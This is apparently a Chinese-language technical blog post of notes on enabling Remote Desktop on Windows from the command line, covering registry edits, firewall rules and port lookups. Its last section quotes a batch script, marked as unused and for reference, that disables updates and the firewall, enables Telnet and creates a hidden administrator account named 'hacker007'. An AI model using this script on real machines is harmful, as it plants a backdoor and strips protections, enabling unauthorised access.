---
title: Enable RDP through cmd line
date: 2017-04-26 19:21:29
tags:
---
## 开启RDP
通过命令行修改注册表。

```bash
# 开启RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
# 关闭RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
# 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

```
<!-- more -->
## RDP端口

```bash
# 查询rdp端口号
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber

```
## 防火墙相关 [Netsh AdvFirewall](https://technet.microsoft.com/en-us/library/dd736198(v=ws.10).aspx)
```bash
# 防火墙状态
netsh advfirewall monitor show firewall

# 允许访问3389端口
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389

# 关闭防火墙
netsh firewall set opmode mode=disable

```

## 开启远程协助
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
```

## 其它
```bash
# 从进程中查找rdp进程
tasklist  /svc | find "TermService"
# 根据pid（1316）查询端口号
netstat -ano | find "1316"
```


## 脚本(maybe dangerous)  <未实际使用，仅供参考>
```bash
@echo off

REM ****************
REM Disable off "AUTO UPDATE"
REM ****************
sc config wuauserv start= disabled
net stop wuauserv

REM ****************
REM Disable windows xp Firewall
REM ****************
netsh firewall set opmode disable

REM ****************
REM Enable TELNET
REM ****************
sc config tlntsvr start= auto
net start telnet

REM ****************
REM Enable Remote Desktop
REM ****************
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM ***************
REM Create a HIDDEN USER usr= hack007, pass= dani
REM ***************
net user hacker007 dani /add
net localgroup "Administrators" /add hacker007
net localgroup "Users" /del hacker007
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker007 /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f

```